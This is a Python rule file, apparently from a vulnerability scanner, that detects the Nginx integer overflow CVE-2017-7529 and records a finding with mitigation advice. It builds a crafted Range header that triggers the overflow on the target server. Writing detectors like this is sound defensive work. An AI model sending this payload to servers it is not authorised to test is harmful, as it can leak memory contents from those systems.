from core.redis      import rds
from core.triage     import Triage
from core.parser     import ScanParser

class Rule:
  def __init__(self):
    self.rule = 'CVE_C2CF'
    self.rule_severity = 2
    self.rule_description = 'This rule checks for Nginx Vulnerability (CVE-2017-7529)'
    self.rule_confirm = 'Nginx Integer Overflow Vulnerability'
    self.rule_details = ''
    self.rule_mitigation = '''Patch Nginx to the latest version.
Refer to the following CVE advisory for more information: https://nvd.nist.gov/vuln/detail/CVE-2017-7529'''
    self.intensity = 1

  def check_rule(self, ip, port, values, conf):
    t = Triage()
    p = ScanParser(port, values)
    
    domain  = p.get_domain()
    module  = p.get_module()
    
    if 'http' not in module:
      return
      
    resp = t.http_request(ip, port)
    
    if resp is None:
      return
    
    server_header = resp.headers.get('Server', None)
    
    if not server_header or 'nginx' not in server_header.lower():
      return
    
    content_length = resp.headers.get('Content-Length', 0)
    bytes_length   = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)
    resp = t.http_request(ip, port, headers={'Range': content_length})
    
    if resp is None:
      return
    
    if resp.status_code == 206 and 'Content-Range' in resp.text:
      self.rule_details = 'Identified Nginx Integer Overflow (CVE-2017-7529) via Content-Range headers'
      rds.store_vuln({
        'ip':ip,
        'port':port,
        'domain':domain,
        'rule_id':self.rule,
        'rule_sev':self.rule_severity,
        'rule_desc':self.rule_description,
        'rule_details':self.rule_details,
        'rule_mitigation':self.rule_mitigation
      })
              
    return